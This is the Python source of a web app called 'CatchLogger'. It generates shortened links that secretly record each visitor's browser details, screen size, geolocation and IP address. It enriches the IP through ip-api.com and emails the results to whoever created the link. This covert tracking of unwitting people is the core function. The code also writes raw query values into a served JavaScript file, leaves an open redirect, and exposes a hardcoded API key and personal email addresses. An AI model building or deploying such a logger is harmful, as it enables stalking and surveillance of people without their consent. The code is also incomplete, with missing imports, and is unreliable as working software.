import os
import json
import tensorflow as tf
import requests


#===============RETURN FILES===============

def page_file(root, filename):
    return static_file(filename, root=root)


def html(filename):
	filename += ".html"
	return static_file(filename, root="./html/")


#================SYSTEM FUNCS==============

def shorten(link):
    url = "https://www.googleapis.com/urlshortener/v1/url?key=AIzaSyAKytZN_unLk1FNtcISeYoWIcm2d8jSPXU"
    header = {'Content-Type': 'application/json'}
    r = requests.post(url, json={"longUrl": link}, headers=header)
    r = json.loads(r.text)
    r = r["id"]
    return r


def send_simple_message(text, adr):
    return requests.post(
        "https://api.mailgun.net/v3/%s/messages" % os.environ['MAILGUN_DOMAIN'],
        auth=("api", os.environ['MAILGUN_API_KEY']),
        data={"from": "CatchLogger NoReply <catchlogger@jkdev.ru>",
              "to": [adr],
              "subject": "CatchLogger Results",
              "html": text})



#===================BODY====================

@get("/")
def man():
    return html("index")


@get("/spasibi")
def faq():
    return html("spasibi")


@get("/login")
def login():
    return html("login")

#-------------------SYSTEM------------------

# Creating link
@post("/createlink/<method>")
def prcss(method):
    rq = request.forms
    howto = rq.get("howto")
    if method == "email":
        link_addr = rq.get("link_addr")
        email = rq.get("email")
        link = "http://cl.jkdev.ru/link?whereto=%s&email=%s&method=%s" % (link_addr, email, method)

        return shorten(link)


# Getting userInfo by link
@get("/link")
def redir():
    rq = request.query
    return template("catch.html", whereto=rq['whereto'], method=rq['method'], email=rq['email'])


# Getting info, forming and sending email
@get("/get_info")
def obr():
    adr = request.query.email
    ip = (request.environ.get('HTTP_X_FORWARDED_FOR') or request.environ.get('REMOTE_ADDR'))
    print(ip)
    d = {}
    info = list("browser, language, OS, navbrser, navos, h, w, location_info".split(", "))
    for i in info:
         d[i] = request.query[i]
         print("i: "+i+"  --  "+d[i])
    coords = list(d['location_info'].split("|"))
    try:
    	d['lat'] = coords[0]
    	d['long'] = coords[1]
    	d['rad'] = coords[2]
    except TypeError:
    	d['lat'] = 'undefined'
    	d['long'] = 'undefined'
    	d['rad'] = "Okay"
    APIipADDR = "http://ip-api.com/json/"+ip
    ip_dic = json.loads(requests.get(APIipADDR).text)
    text = mail.text % (d['browser'], d['language'], d['OS'], d['navbrser'], d['navos'], d['h'], d['w'], d['lat'], d['long'], d['rad'], d['lat'], d['long'], d['rad'], ip, ip_dic["org"], ip_dic["regionName"], ip_dic["city"])
    send_simple_message(text, adr)
    print("SENT MAIL TO " + str(adr))
    

# RETURNING LOCATION MAP (email link)
# needs to be improved - USE TEMPLATES, don't read files with js!!!
@get("/locvar_access")
def lcvr():
    lat = request.query['lat']
    lng = request.query['lng']
    rad = request.query['rad']
    locvar = open("locvar_storage.js", 'w')
    towrite = """var get_lat = %s
var get_lng = %s
var get_rad = %s""" % (lat, lng, rad)
    locvar.write(towrite)
    locvar.close()
    return static_file("circler.html", root='.')

@get("/sendnow")
def s():
    send_simple_message("test", "andtun@yandex.ru")


# =========================FOR BEAUTY==========================

@route("/<root>/<filename>")
def f(root, filename):
    return page_file(root, filename)

@route("/css/font-awesome/css/font-awesome.min.css")
def font():
    return static_file("font-awesome.min.css", root="./css/font-awesome/css/")

@route("/images/logo.png")
def logo():
    return static_file("Logo.png", root='./images/')

@route("/locvar_storage.js")
def locvar():
    return static_file("locvar_storage.js", root='.')

@get("/getXML.js")
def js():
    return static_file("getXML.js", root="./js/")

@get("/browser.js")
def br():
    return static_file("browser.js", root='./js/')

@get("/favicon.ico")
def fvcn():
    return static_file("favicon.ico", root='.')

@error(404)
def fff(error):
    return html("404")

@error(500)
def fff(error):
    return html("500")
# -------------------------------------------------------------

#---------------
# test logger
@get("/catch")
def chk():
    return html("catch")
#---------------

# If redirect not working
# !!!SHOULD STAY IN THE END!!!
@get("/<somewhere>")
def red(somewhere):
    somewhere = "http://" + somewhere
    redirect(somewhere)


run(host="0.0.0.0", port=os.environ.get('PORT', 5000), debug=False)
